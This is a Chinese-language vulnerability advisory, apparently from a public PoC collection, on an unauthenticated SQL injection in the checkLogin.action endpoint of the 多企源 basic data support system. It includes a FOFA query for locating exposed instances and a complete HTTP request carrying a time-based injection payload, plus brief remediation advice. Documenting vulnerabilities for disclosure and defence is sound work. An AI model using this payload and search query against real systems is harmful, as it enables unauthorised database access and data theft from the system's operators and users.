---

source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 多企源-基础数据支撑系统 checkLogin存在SQL注入漏洞 

# 漏洞描述

多企源-基础数据支撑系统 checkLogin.action 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

多企源-基础数据支撑系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="多企源-基础数据支撑系统"

POC/EXP：

POST /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:9%27-- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: zh-CN
Connection: keep-alive

![image-20241019185358941](./.resource/多企源-基础数据支撑系统checkLogin存在SQL注入漏洞/media/image-20241019185358941.png)


![image-20241019185419844](./.resource/多企源-基础数据支撑系统checkLogin存在SQL注入漏洞/media/image-20241019185419844.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限。

联系厂家及时打补丁。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
